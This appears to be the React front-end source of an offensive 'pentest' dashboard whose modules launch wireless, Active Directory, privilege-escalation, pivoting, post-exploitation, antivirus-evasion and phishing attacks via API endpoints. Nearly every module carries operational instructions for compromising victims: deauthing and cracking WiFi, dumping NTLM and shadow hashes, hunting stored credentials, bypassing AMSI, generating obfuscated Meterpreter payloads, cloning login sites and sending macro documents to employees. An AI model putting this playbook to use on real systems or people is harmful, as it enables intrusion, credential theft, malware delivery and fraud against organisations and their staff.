      <div style={{background:`linear-gradient(135deg,${color}18,transparent)`,borderBottom:"1px solid #1e293b",padding:"16px 24px 14px"}}>
        <div style={{display:"flex",alignItems:"center",justifyContent:"space-between"}}>
          <div style={{display:"flex",alignItems:"center",gap:10}}>
            <span style={{fontSize:24}}>{icon}</span>
            <div>
              <h2 style={{fontSize:17,fontWeight:700,color:"#f1f5f9",margin:0}}>{title}</h2>
              <p style={{fontSize:12,color:"#64748b",margin:0}}>{desc}</p>
            </div>
          </div>
          <div style={{display:"flex",gap:8}}>
            <button onClick={()=>setGuide(g=>!g)}
              style={{background:guide?"#1e3a5f":"#0f172a",border:`1px solid ${guide?"#3b82f6":"#334155"}`,borderRadius:6,padding:"6px 12px",color:guide?"#93c5fd":"#94a3b8",fontSize:11,fontWeight:700,cursor:"pointer"}}>
              {guide?"✕ Hide Guide":"📋 How to Use"}
            </button>
            {hasResults && (
              <button onClick={()=>generateShellReport({title,icon,target,attacks,results})}
                style={{background:"#ef4444",border:"none",borderRadius:6,padding:"8px 18px",color:"#fff",fontSize:13,fontWeight:700,cursor:"pointer"}}>
                📄 Report
              </button>
            )}
          </div>
        </div>
      </div>

      {/* How To Use Guide */}
      {guide && (
        <div style={{margin:"12px 24px 0",background:"#0a1628",border:"1px solid #1e3a5f",borderRadius:8,padding:"14px 16px"}}>
          <div style={{fontSize:12,fontWeight:700,color:"#93c5fd",marginBottom:10}}>📋 How to Run This Module</div>
          <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(280px,1fr))",gap:10}}>
            {attacks.map(atk=>(
              <div key={atk.id} style={{background:"#0d1f35",borderRadius:6,padding:"10px 12px",border:"1px solid #1e3a5f"}}>
                <div style={{display:"flex",alignItems:"center",gap:6,marginBottom:6}}>
                  <span style={{fontSize:14}}>{atk.icon}</span>
                  <span style={{fontSize:11,fontWeight:700,color:"#f1f5f9"}}>{atk.label}</span>
                </div>
                {atk.target_type && <div style={{fontSize:9,color:"#fbbf24",marginBottom:4}}>🎯 Target: {atk.target_type}</div>}
                {atk.howto && <div style={{fontSize:10,color:"#94a3b8",marginBottom:5,lineHeight:1.5}}>{atk.howto}</div>}
                {atk.requires && <div style={{fontSize:9,color:"#f97316",marginBottom:5}}>⚠ Requires: {atk.requires}</div>}
                {atk.vulns && atk.vulns.length>0 && (
                  <div style={{marginBottom:5}}>
                    <div style={{fontSize:9,color:"#64748b",marginBottom:3,textTransform:"uppercase",fontWeight:700}}>Vulnerabilities Detected:</div>
                    {atk.vulns.map((v,i)=>(
                      <div key={i} style={{fontSize:9,color:"#4ade80",display:"flex",alignItems:"center",gap:4,marginBottom:2}}>
                        <span style={{color:"#22c55e",flexShrink:0}}>✓</span>{v}
                      </div>
                    ))}
                  </div>
                )}
                {atk.hackerImpact && (
                  <div style={{background:"#1a0505",border:"1px solid #7f1d1d",borderRadius:4,padding:"6px 8px",marginTop:4}}>
                    <div style={{fontSize:9,color:"#f87171",fontWeight:700,marginBottom:3}}>🔴 Hacker Impact:</div>
                    <div style={{fontSize:9,color:"#fca5a5",lineHeight:1.5}}>{atk.hackerImpact}</div>
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Target + Inputs */}
      <div style={{padding:"12px 24px 0"}}>
        <div style={{display:"flex",gap:8,marginBottom:12,flexWrap:"wrap"}}>
          {/* Honeypot inputs absorb Chrome's username/password autofill so the
              real target field stays clean. Without this, Chrome was filling
              "ADMIN" (the logged-in user's username) into the target. */}
          <input type="text"     name="username" tabIndex={-1} autoComplete="username"         defaultValue="" style={{position:"absolute",left:-9999,opacity:0,width:1,height:1,pointerEvents:"none"}}/>
          <input type="password" name="password" tabIndex={-1} autoComplete="current-password" defaultValue="" style={{position:"absolute",left:-9999,opacity:0,width:1,height:1,pointerEvents:"none"}}/>
          <input value={target} onChange={e=>setTarget(e.target.value)}
            placeholder="Target IP / Domain / URL"
            autoComplete="off" autoCorrect="off" autoCapitalize="off" spellCheck={false}
            name="moduleshell-target" data-form-type="other" aria-autocomplete="none"
            style={{flex:1,minWidth:220,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 12px",color:"#f1f5f9",fontSize:13,outline:"none"}}/>
          {extraInputs && extraInputs(opts, setOpts)}
        </div>

        {/* Attack Cards */}
        <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(300px,1fr))",gap:12}}>
          {attacks.map(atk => {
            const res = results[atk.id];
            const isLoading = loading === atk.id;
            const findings = res?.findings || [];
            const hasCrit = findings.some(f=>["CRITICAL","HIGH"].includes(f.severity));
            const borderCol = res?.error?"#ef4444":hasCrit?"#dc2626":res?"#1e40af":"#1e293b";
            return (
              <div key={atk.id} style={{background:"#0a0f1e",border:`1px solid ${borderCol}`,borderRadius:8,overflow:"hidden"}}>
                <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",padding:"10px 14px",background:"#0d1526"}}>
                  <div style={{display:"flex",alignItems:"center",gap:8}}>
                    <span style={{fontSize:16}}>{atk.icon}</span>
                    <div>
                      <div style={{fontSize:12,fontWeight:700,color:"#f1f5f9"}}>{atk.label}</div>
                      <div style={{fontSize:10,color:"#475569"}}>{atk.desc}</div>
                    </div>
                  </div>
                  <button onClick={()=>run(atk)} disabled={isLoading||!target}
                    style={{background:isLoading?"#1e293b":color,border:"none",borderRadius:4,padding:"5px 12px",color:"#fff",fontSize:11,fontWeight:700,cursor:isLoading||!target?"not-allowed":"pointer",opacity:!target?0.4:1,flexShrink:0}}>
                    {isLoading?"…":"Run"}
                  </button>
                </div>
                {res && (
                  <div style={{padding:"10px 14px",maxHeight:240,overflowY:"auto"}}>
                    {res.error && <div style={{color:"#ef4444",fontSize:11,marginBottom:4}}>⚠ {res.error}</div>}
                    {res.message && (
                      <div style={{color:res.message.includes("❌")?"#f87171":res.message.includes("✅")?"#4ade80":"#94a3b8",fontSize:11,marginBottom:6,fontWeight:600}}>{res.message}</div>
                    )}
                    {findings.length>0 && findings.slice(0,12).map((f,i)=>(
                      <div key={i} style={{display:"flex",gap:6,alignItems:"flex-start",marginBottom:4,fontSize:11}}>
                        <span style={{background:sevColor(f.severity),color:"#fff",borderRadius:3,padding:"1px 5px",fontSize:9,fontWeight:700,flexShrink:0,marginTop:1}}>{f.severity||"INFO"}</span>
                        <span style={{color:"#cbd5e1"}}>{f.title||""}{f.detail?" — "+String(f.detail).slice(0,80):""}</span>
                      </div>
                    ))}
                    {findings.length===0 && !res.error && !res.message && res.raw_output && (
                      <pre style={{fontSize:9,color:"#64748b",margin:0,whiteSpace:"pre-wrap",maxHeight:140,overflow:"auto"}}>{String(res.raw_output).slice(0,800)}</pre>
                    )}
                    {res.commands && Object.entries(res.commands).slice(0,5).map(([k,v])=>(
                      <div key={k} style={{marginBottom:6}}>
                        <div style={{fontSize:9,color:"#94a3b8",marginBottom:2,textTransform:"uppercase",fontWeight:700}}>{k}</div>
                        <pre style={{fontSize:9,color:"#4ade80",background:"#020617",borderRadius:4,padding:"5px 8px",margin:0,whiteSpace:"pre-wrap",overflowX:"auto"}}>{String(v).slice(0,200)}</pre>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
}

// ── WIRELESS ATTACKS ─────────────────────────────────────────
function WirelessModule({token, apiUrl}) {
  const attacks = [
    {id:"interfaces",label:"List Interfaces",  icon:"📡",ep:"/api/wireless/interfaces",
     desc:"Show wireless network interfaces (iwconfig)",
     howto:"No target needed. Shows all wireless NICs on Kali. You need a wireless adapter that supports monitor mode (e.g. Alfa AWUS036ACH). Note the interface name (wlan0, wlan1).",
     requires:"Wireless NIC with monitor mode support",
     vulns:["Adapter capability check","Monitor mode availability"]},
    {id:"scan",      label:"Network Scan",     icon:"🔍",ep:"/api/wireless/scan",
     desc:"Scan nearby WiFi networks (airodump-ng)",
     howto:"Enter interface name (e.g. wlan0) as target. First put adapter in monitor mode: sudo airmon-ng start wlan0. Then scan shows all nearby APs with BSSID, channel, encryption.",
     requires:"Wireless NIC in monitor mode + physical proximity to targets",
     vulns:["Open networks (no encryption)","WEP encryption (broken)","WPS enabled","Hidden SSID broadcast","Rogue AP detection"]},
    {id:"deauth",    label:"Deauth Attack",    icon:"💥",ep:"/api/wireless/deauth",
     desc:"Send deauthentication frames (aireplay-ng)",
     howto:"Enter interface as target. Fill BSSID field with AP MAC address from the scan. Forces clients to disconnect and reconnect — captures WPA handshake during reconnection.",
     requires:"Monitor mode NIC + BSSID from scan",
     vulns:["Wireless deauthentication (CVE-2004-0459)","WPA handshake capture","Denial of Service","Client disconnection attack"]},
    {id:"wifite",    label:"Auto Attack",      icon:"🤖",ep:"/api/wireless/wifite",
     desc:"Automated WiFi attack (wifite)",
     howto:"Enter interface name as target. Wifite automatically puts NIC in monitor mode, scans, captures handshakes and attacks WEP/WPA/WPS networks. Takes 1-5 minutes.",
     requires:"Wireless NIC + proximity to target networks",
     vulns:["WEP cracking (instant)","WPA/WPA2 handshake capture","WPS PIN brute force","PMKID attack"]},
    {id:"crack",     label:"Crack Handshake",  icon:"🔓",ep:"/api/wireless/crack",
     desc:"Crack WPA handshake (aircrack-ng + rockyou)",
     howto:"Capture a .cap file first using scan or wifite. Enter .cap file path in target field. Uses rockyou.txt wordlist. For stronger passwords use hashcat with GPU.",
     requires:"WPA handshake .cap file + /usr/share/wordlists/rockyou.txt",
     vulns:["Weak WPA/WPA2 passphrases","Dictionary attack success","Password reuse","Missing WPA3 protection"]},
  ];
  const extra = (opts,setOpts) => (<>
    <input placeholder="Interface (wlan0)" value={opts.iface||""} onChange={e=>setOpts(p=>({...p,iface:e.target.value}))}
      style={{width:130,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
    <input placeholder="BSSID (deauth)" value={opts.bssid||""} onChange={e=>setOpts(p=>({...p,bssid:e.target.value}))}
      style={{width:155,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
  </>);
  return <ModuleShell title="Wireless Attacks" icon="📶" color="#8b5cf6" desc="WiFi penetration — network scan, WPA handshake capture, deauth, aircrack-ng cracking" token={token} apiUrl={apiUrl} attacks={attacks} extraInputs={extra} bodyFn={(t,o)=>({target:t,options:o})}/>;
}

// ── ACTIVE DIRECTORY ─────────────────────────────────────────
function ActiveDirectoryModule({token, apiUrl}) {
  const attacks = [
    {id:"enum",       label:"AD Enumeration",    icon:"🗂", ep:"/api/ad/enum",
     desc:"enum4linux + LDAP — users, groups, shares, policies",
     howto:"Enter DC IP as target. Fill in Domain (e.g. corp.local). No credentials needed for null session. Run on port 389/445.",
     requires:"Windows Active Directory Domain Controller",
     vulns:["Null session authentication","Anonymous LDAP bind","SMB share misconfiguration","Password policy exposure","User enumeration"]},
    {id:"kerberoast", label:"Kerberoasting",     icon:"🎟", ep:"/api/ad/kerberoast",
     desc:"GetUserSPNs.py — extract service account hashes",
     howto:"Enter DC IP, fill Domain + Username + Password. Finds service accounts with SPNs and requests their TGS tickets for offline cracking.",
     requires:"Valid domain user credentials + Windows DC",
     vulns:["Service accounts with weak passwords","SPN misconfiguration","Kerberos ticket exposure","Offline password cracking risk"]},
    {id:"asreproast", label:"AS-REP Roasting",   icon:"🍖", ep:"/api/ad/asreproast",
     desc:"GetNPUsers.py — no-preauth account hash extraction",
     howto:"Enter DC IP, fill Domain. Targets accounts with 'Do not require Kerberos pre-authentication' enabled. Hashes can be cracked with hashcat -m 18200.",
     requires:"Windows DC + known username list",
     vulns:["Kerberos pre-auth disabled on accounts","AS-REP hash cracking","Weak password policy"]},
    {id:"bloodhound", label:"BloodHound Collect",icon:"🐕", ep:"/api/ad/bloodhound",
     desc:"bloodhound-python — map all paths to Domain Admin",
     howto:"Enter DC IP, fill Domain + credentials. Collects AD relationships and outputs ZIP. Import into BloodHound GUI to visualize attack paths to Domain Admin.",
     requires:"Valid domain credentials + BloodHound GUI installed",
     vulns:["Shortest path to Domain Admin","ACL abuse paths","Unconstrained delegation","DCSync rights","AdminTo relationships"]},
    {id:"secretsdump",label:"Secrets Dump",      icon:"💾", ep:"/api/ad/secretsdump",
     desc:"secretsdump.py — extract NTLM hashes from DC",
     howto:"Enter DC IP + Domain Admin credentials. Dumps all NTLM password hashes from the domain. Use hashes for Pass-the-Hash or crack offline.",
     requires:"Domain Admin or replication rights",
     vulns:["NTLM hash extraction","DCSync attack","Pass-the-Hash potential","Credential exposure","Lateral movement risk"]},
    {id:"psexec",     label:"PsExec Shell",      icon:"🖥", ep:"/api/ad/psexec",
     desc:"psexec.py — shell via SMB with valid credentials",
     howto:"Enter target IP + Domain + credentials. Launches remote SYSTEM shell via SMB. Requires admin shares (C$) to be accessible.",
     requires:"Local or domain admin credentials + SMB port 445 open",
     vulns:["Remote code execution via SMB","Missing SMB signing","Weak admin credentials","Lateral movement"]},
  ];
  const extra = (opts,setOpts) => (<>
    <input placeholder="Domain (corp.local)" value={opts.domain||""} onChange={e=>setOpts(p=>({...p,domain:e.target.value}))}
      style={{width:140,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
    <input placeholder="Username" value={opts.username||""} onChange={e=>setOpts(p=>({...p,username:e.target.value}))}
      style={{width:110,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
    <input type="password" placeholder="Password" value={opts.password||""} onChange={e=>setOpts(p=>({...p,password:e.target.value}))}
      style={{width:110,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
  </>);
  return <ModuleShell title="Active Directory Attacks" icon="🏰" color="#ef4444" desc="Full AD attack chain — Kerberoasting, AS-REP Roasting, BloodHound, DCSync, PsExec" token={token} apiUrl={apiUrl} attacks={attacks} extraInputs={extra} bodyFn={(t,o)=>({target:t,options:{...o,dc_ip:t}})}/>;
}

// ── PRIVILEGE ESCALATION ─────────────────────────────────────
function PrivescModule({token, apiUrl}) {
  const attacks = [
    {id:"linpeas",      label:"LinPEAS",            icon:"🦅",ep:"/api/privesc/linpeas",
     desc:"Full automated Linux privilege escalation scan",
     howto:"Run on the TARGET machine after gaining a shell. No target IP needed — runs locally on Kali or the victim machine. Place linpeas.sh at /tmp/linpeas.sh first.",
     requires:"Shell access on Linux target",
     vulns:["SUID/SGID binaries","Writable /etc/passwd","Sudo misconfigs","Writable cron","World-writable service files","PATH hijacking","NFS no_root_squash","Docker group membership"]},
    {id:"suid",         label:"SUID Binaries",      icon:"🔑",ep:"/api/privesc/suid",
     desc:"Find SUID — cross-check against GTFOBins",
     howto:"Run locally after gaining shell. Finds all binaries with SUID bit set. CRITICAL results can be exploited via GTFOBins (gtfobins.github.io) to get root.",
     requires:"Shell access on Linux target",
     vulns:["SUID python/perl/bash → instant root","SUID find/vim/nmap → command execution","Custom SUID binaries","Shared library injection"]},
    {id:"sudo",         label:"Sudo Analysis",      icon:"👑",ep:"/api/privesc/sudo",
     desc:"sudo -l — detect exploitable allowed commands",
     howto:"Run locally after gaining shell. Checks what commands current user can run as root. CRITICAL if any GTFOBins binary is listed with NOPASSWD.",
     requires:"Shell access on Linux target",
     vulns:["NOPASSWD sudo on GTFOBins binary","sudo ALL privileges","Dangerous command allowed (vim, find, less)","sudo version exploit (CVE-2021-3156)"]},
    {id:"capabilities", label:"Linux Capabilities", icon:"⚙", ep:"/api/privesc/capabilities",
     desc:"getcap -r — find cap_setuid / cap_sys_admin",
     howto:"Run locally after gaining shell. Capabilities give programs elevated privileges without full root. cap_setuid on python = root shell instantly.",
     requires:"Shell access on Linux target",
     vulns:["cap_setuid → root shell","cap_sys_admin → container escape","cap_net_raw → packet sniffing","cap_dac_override → bypass file permissions"]},
    {id:"cron",         label:"Cron Jobs",          icon:"⏰",ep:"/api/privesc/cron",
     desc:"Find world-writable cron scripts and paths",
     howto:"Run locally. Finds cron jobs running as root. If the script is world-writable, replace it with a reverse shell. PATH hijacking also possible.",
     requires:"Shell access on Linux target",
     vulns:["World-writable cron script","Cron runs script from writable directory","PATH hijacking in cron","Wildcard injection in cron tar/rsync"]},
    {id:"suggest",      label:"Exploit Suggester",  icon:"💡",ep:"/api/privesc/linux_suggest",
     desc:"Kernel version → matching public exploits",
     howto:"Run locally. Checks kernel version against known local privilege escalation exploits. Download matching exploit from exploit-db and compile on target.",
     requires:"Shell access on Linux target + les.py at /tmp/",
     vulns:["Dirty COW (CVE-2016-5195)","OverlayFS (CVE-2021-3493)","PwnKit (CVE-2021-4034)","Baron Samedit sudo (CVE-2021-3156)"]},
  ];
  return <ModuleShell title="Privilege Escalation" icon="📈" color="#f59e0b" desc="Automated Linux privesc — LinPEAS, SUID abuse, sudo misconfig, capabilities, cron jobs" token={token} apiUrl={apiUrl} attacks={attacks}/>;
}

// ── PIVOTING & TUNNELING ─────────────────────────────────────
function TunnelModule({token, apiUrl}) {
  const attacks = [
    {id:"chisel", label:"Chisel Tunnel", icon:"🔧", ep:"/api/tunnel/chisel",
     desc:"SOCKS5/TCP tunnel — server + client commands",
     howto:"Enter pivot host IP as target. Fill LHOST (your Kali IP) and LPORT (e.g. 8080). Run chisel server on Kali, upload agent to compromised host. Routes traffic through the victim into internal network.",
     requires:"Shell access on pivot host + chisel binary uploaded to victim",
     target_type:"Linux/Windows pivot host after initial compromise",
     vulns:["Network segmentation bypass","Internal network access","Firewall evasion","Lateral movement enablement"],
     hackerImpact:"Attacker uses the compromised host as a jump point to reach internal servers not accessible from internet. Can attack internal databases, AD, and other systems."},
    {id:"socat", label:"Socat Relay", icon:"🔀", ep:"/api/tunnel/socat",
     desc:"TCP port relay and forwarding",
     howto:"Enter pivot host IP as target. Set LHOST/LPORT (your Kali) and RHOST/RPORT (internal target). Socat relays your traffic through the pivot host to the internal target.",
     requires:"Shell access on pivot host + socat installed",
     target_type:"Linux pivot host",
     vulns:["Port forwarding through firewall","Protocol tunneling","Blind relay attack"],
     hackerImpact:"Creates a relay from attacker to internal server. All traffic looks like it originates from the pivot machine, bypassing network controls."},
    {id:"ssh", label:"SSH Port Forwarding", icon:"🔐", ep:"/api/tunnel/ssh",
     desc:"Local, remote and dynamic SSH tunnels",
     howto:"Enter SSH server IP as target. Set username, LPORT (local port), and RHOST:RPORT (internal target). Local forward: access internal services. Dynamic: full SOCKS5 proxy.",
     requires:"SSH access to pivot machine (Linux)",
     target_type:"Linux server with SSH access",
     vulns:["SSH tunnel to bypass firewall","SOCKS5 proxy via SSH -D","Reverse tunnel from restricted network"],
     hackerImpact:"Attacker creates encrypted tunnel to access internal network. Even if only SSH port 22 is open, they can reach any internal service through it."},
    {id:"proxychains", label:"Proxychains Config", icon:"⛓", ep:"/api/tunnel/proxychains",
     desc:"Auto-generate proxychains.conf + usage guide",
     howto:"Enter proxy IP as target. Select proxy type (socks5/http) and fill proxy port. Generated config lets you run any tool through the proxy tunnel (nmap, curl, etc.).",
     requires:"An active SOCKS5/HTTP proxy (Chisel, SSH -D, or Metasploit route)",
     target_type:"Used after pivot tunnel is established",
     vulns:["Tool routing through compromised network","NAC/firewall bypass","Internal scanning"],
     hackerImpact:"Once proxy is set up, attacker can use any tool (nmap, sqlmap, hydra) against internal targets as if they were on the internal network."},
    {id:"ligolo", label:"Ligolo-ng", icon:"🌐", ep:"/api/tunnel/ligolo",
     desc:"Ligolo-ng agent + proxy setup commands",
     howto:"Enter pivot host IP as target. Set LHOST (Kali) and LPORT. Upload Ligolo agent to victim, run proxy on Kali. Creates a tun interface — scan internal network directly without proxychains.",
     requires:"Shell access on pivot host + Ligolo binaries",
     target_type:"Linux/Windows pivot host",
     vulns:["Full layer-3 network pivoting","Transparent internal access","Multi-hop pivoting"],
     hackerImpact:"Most powerful pivot tool — creates a real network interface on Kali that routes into the internal network. Attacker can run any tool natively against internal hosts."},
  ];
  const extra = (opts,setOpts) => (<>
    <input placeholder="LHOST (attacker IP)" value={opts.lhost||""} onChange={e=>setOpts(p=>({...p,lhost:e.target.value}))}
      style={{width:150,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
    <input placeholder="LPORT" value={opts.lport||"8080"} onChange={e=>setOpts(p=>({...p,lport:e.target.value}))}
      style={{width:90,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
  </>);
  return <ModuleShell title="Pivoting & Tunneling" icon="🕳" color="#06b6d4" desc="Network pivoting through compromised hosts — Chisel, Ligolo-ng, Socat, SSH, Proxychains" token={token} apiUrl={apiUrl} attacks={attacks} extraInputs={extra} bodyFn={(t,o)=>({target:t,options:{...o,rhost:t}})}/>;
}

// ── POST EXPLOITATION ─────────────────────────────────────────
function PostExploitModule({token, apiUrl}) {
  const attacks = [
    {id:"hashdump", label:"Hash Dump", icon:"🔓", ep:"/api/post/hashdump",
     desc:"Dump /etc/shadow — extract password hashes",
     howto:"Run locally on the compromised Linux machine. No target needed — reads /etc/shadow. Requires root or sudo. Hashes can be cracked with hashcat or john offline.",
     requires:"Root shell on Linux target",
     target_type:"Linux servers (web servers, VMs, Docker containers)",
     vulns:["Weak password hashes (MD5, SHA1)","Reused passwords across systems","Root account hash exposure","Service account credentials"],
     hackerImpact:"Attacker extracts all user passwords. Cracked passwords used to log in to other systems, email, VPN, cloud consoles. One weak password can compromise the entire organization."},
    {id:"creds", label:"Credential Hunt", icon:"🔍", ep:"/api/post/creds",
     desc:"Search configs/env files for cleartext passwords",
     howto:"Run on compromised Linux/Windows machine. Searches common locations: .env files, config.php, web.config, wp-config.php, database.yml, .git folders, bash history.",
     requires:"Shell access on target",
     target_type:"Web servers (Apache, Nginx, Node.js, PHP, WordPress)",
     vulns:["Hardcoded database passwords","API keys in source code","AWS/cloud credentials in .env","Database connection strings","SSH private keys in repositories"],
     hackerImpact:"Developer puts database password in config file — attacker reads it and gets direct database access. AWS keys found = full cloud account takeover. This is how most real breaches happen."},
    {id:"persistence_check", label:"Persistence Check", icon:"🕵", ep:"/api/post/persistence_check",
     desc:"Detect persistence mechanisms already installed",
     howto:"Run on target system (defensive use or after compromise). Checks crontabs, startup scripts, systemd services, authorized_keys, .bashrc for backdoors.",
     requires:"Shell access on Linux target",
     target_type:"Any Linux server (incident response)",
     vulns:["Reverse shell in cron","Backdoor SSH key in authorized_keys","Malicious systemd service",".bashrc modification","Startup script injection"],
     hackerImpact:"Advanced attacker installs persistence so they keep access even after reboot or password change. Defenders use this to detect if they've been compromised."},
    {id:"network_enum", label:"Internal Network", icon:"🌐", ep:"/api/post/network_enum",
     desc:"Map internal net — routes, ARP table, hosts file",
     howto:"Run on compromised machine. Discovers all internal subnets, nearby hosts, and open services. Use findings to plan lateral movement to other machines.",
     requires:"Shell access on any internal host",
     target_type:"Any compromised Linux/Windows machine inside network",
     vulns:["Internal network exposure","Unprotected internal services","Flat network (no segmentation)","Internal database servers reachable"],
     hackerImpact:"After hacking one machine, attacker maps the entire internal network. Finds database servers, backup systems, domain controllers — targets not exposed to internet."},
    {id:"loot", label:"Loot Search", icon:"💎", ep:"/api/post/loot",
     desc:"Find SSH keys, AWS creds, .git credentials",
     howto:"Run on compromised machine. Searches /home, /root, ~/.ssh, ~/.aws, .git-credentials, KeePass files, browser stored passwords. Everything found is high-value.",
     requires:"Shell access on target",
     target_type:"Developer workstations, CI/CD servers, build machines",
     vulns:["Unencrypted SSH private keys","AWS/GCP credentials stored on disk","Password manager files","Browser saved passwords","Git credentials"],
     hackerImpact:"Developer machine often has SSH keys to production servers, cloud API keys, and git credentials. Attacker pivots from developer laptop to entire cloud infrastructure."},
  ];
  return <ModuleShell title="Post Exploitation" icon="🎯" color="#10b981" desc="After gaining shell — credential harvesting, persistence detection, internal network mapping" token={token} apiUrl={apiUrl} attacks={attacks}/>;
}

// ── ANTIVIRUS EVASION ─────────────────────────────────────────
function AVEvasionModule({token, apiUrl}) {
  const attacks = [
    {id:"check", label:"Detect AV/EDR", icon:"🛡", ep:"/api/av/check",
     desc:"Identify running antivirus and EDR on target",
     howto:"Run on compromised Windows/Linux machine. Detects running AV processes (Defender, CrowdStrike, SentinelOne, Sophos, Carbon Black). Helps choose right evasion technique.",
     requires:"Shell access on target",
     target_type:"Windows servers and workstations",
     vulns:["No AV/EDR installed","Outdated AV signatures","AV gaps between scan intervals","EDR blind spots"],
     hackerImpact:"If no AV found, attacker can deploy payloads directly. Knowing which AV is running helps choose the right bypass technique. Missing AV = easy malware deployment."},
    {id:"amsi", label:"AMSI Bypass", icon:"🚫", ep:"/api/av/amsi_bypass",
     desc:"Windows AMSI bypass code snippets + techniques",
     howto:"Target is Windows machine. AMSI (Antimalware Scan Interface) blocks malicious PowerShell. These techniques patch AMSI in memory to allow running malicious PS scripts undetected.",
     requires:"PowerShell execution on Windows target",
     target_type:"Windows servers and workstations with PowerShell",
     vulns:["AMSI implementation in userspace (bypassable)","PowerShell script block logging disabled","Constrained Language Mode not enforced"],
     hackerImpact:"Once AMSI is bypassed, attacker can run Mimikatz, BloodHound, Empire, and other PowerShell-based attack tools that Defender would normally block."},
    {id:"veil", label:"Veil Evasion", icon:"👻", ep:"/api/av/veil",
     desc:"Veil framework — AV-evading payload generation",
     howto:"Fill LHOST (your Kali IP) and LPORT. Veil generates exe/ps1 payload that bypasses most AV. Deliver to target via phishing or file upload vulnerability.",
     requires:"Kali Linux with Veil installed (apt install veil)",
     target_type:"Windows targets with antivirus",
     vulns:["AV signature-based detection bypass","Heuristic analysis evasion","Payload delivery to Windows systems"],
     hackerImpact:"Standard msfvenom payloads get caught by AV instantly. Veil-generated payloads use obfuscation to bypass signatures — attacker gets a shell even on protected Windows systems."},
    {id:"obfuscate", label:"Payload Obfuscation", icon:"🌀", ep:"/api/av/obfuscate",
     desc:"msfvenom multi-encoder to evade signature detection",
     howto:"Fill LHOST and LPORT. Generates Windows x64 meterpreter payload encoded 5x with XOR cipher. Output .exe can be delivered via USB, email attachment, or file upload.",
     requires:"msfvenom + Kali Linux",
     target_type:"Windows servers and workstations",
     vulns:["Multi-layer encoding defeats signature detection","XOR obfuscation hides shellcode","Static analysis evasion"],
     hackerImpact:"Multi-encoded payloads slip past AV that scans file signatures. User runs what looks like a normal program, attacker gets a Meterpreter shell with full system control."},
  ];
  const extra = (opts,setOpts) => (<>
    <input placeholder="LHOST" value={opts.lhost||""} onChange={e=>setOpts(p=>({...p,lhost:e.target.value}))}
      style={{width:140,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
    <input placeholder="LPORT" value={opts.lport||"4444"} onChange={e=>setOpts(p=>({...p,lport:e.target.value}))}
      style={{width:90,background:"#0f172a",border:"1px solid #334155",borderRadius:6,padding:"8px 10px",color:"#f1f5f9",fontSize:12,outline:"none"}}/>
  </>);
  return <ModuleShell title="Antivirus Evasion" icon="👻" color="#a855f7" desc="AV/EDR detection, AMSI bypass, Veil Evasion framework, multi-encoder payload obfuscation" token={token} apiUrl={apiUrl} attacks={attacks} extraInputs={extra} bodyFn={(t,o)=>({target:t,options:o})}/>;
}

// ── SOCIAL ENGINEERING ────────────────────────────────────────
function SocialEngineeringModule({token, apiUrl}) {
  const attacks = [
    {id:"phishing", label:"Phishing Template", icon:"📧", ep:"/api/se/phishing",
     desc:"Email lure + landing page HTML generator",
     howto:"Enter victim company domain/website as target. Set Org Name in the field. Generates a convincing phishing email template and a fake login page. Host page on Kali and send email to employees.",
     requires:"Web server to host fake page + email account for sending",
     target_type:"Any organization — email users, employees",
     vulns:["No email security (SPF/DKIM/DMARC missing)","Employees not trained in phishing awareness","No MFA on accounts"],
     hackerImpact:"Employee receives fake 'password reset' email, enters credentials on attacker's page. Attacker logs in to corporate email, VPN, or cloud systems. 90% of breaches start with phishing."},
    {id:"clone", label:"Website Clone", icon:"🪞", ep:"/api/se/clone",
     desc:"Mirror target site for credential harvesting",
     howto:"Enter target website URL (e.g. https://company.com). Clone downloads exact copy. Add credential harvesting code, host on Kali, send link to victims via phishing email.",
     requires:"Target website URL + Kali HTTP server to host clone",
     target_type:"Any website — corporate login, VPN portal, webmail",
     vulns:["No certificate pinning","Users trust visual appearance over URL","Missing browser security headers"],
     hackerImpact:"Cloned site looks identical to real one. Victims enter real credentials which go to attacker. Works on any web-based login: Office 365, corporate VPN, banking portals."},
    {id:"set_launcher", label:"SET Harvester", icon:"🎣", ep:"/api/se/set_launcher",
     desc:"Social Engineering Toolkit credential harvester",
     howto:"Enter target company domain as target. Follow the menu: SET → Website Attacks → Credential Harvester → Site Cloner. SET automates everything — cloning, hosting, and capturing credentials.",
     requires:"setoolkit installed (kali: apt install set)",
     target_type:"Any organization with web login portals",
     vulns:["Unaware employees","No phishing simulation training","Weak email filters"],
     hackerImpact:"Professional phishing framework used by real attackers. Captures usernames and passwords automatically. Supports multi-factor authentication bypass via real-time proxy."},
    {id:"payload_delivery", label:"Payload Delivery", icon:"📎", ep:"/api/se/payload_delivery",
     desc:"HTA / VBA / PS1 malicious document generation",
     howto:"Enter your Kali IP as target. Fill LHOST/LPORT. Select payload type: HTA (email link), DOC (email attachment Word macro), PS1 (PowerShell script). Attach/link in phishing email.",
     requires:"nc/metasploit listener on LHOST:LPORT",
     target_type:"Windows users — email recipients, employees",
     vulns:["Macros enabled in Office","HTA files executed by IE/Edge","PowerShell unrestricted execution policy","No application whitelisting"],
     hackerImpact:"User opens Word doc and clicks Enable Macros — attacker gets reverse shell. 60% of malware is delivered via Office macros. Works through most email filters as documents look legitimate."},
  ];
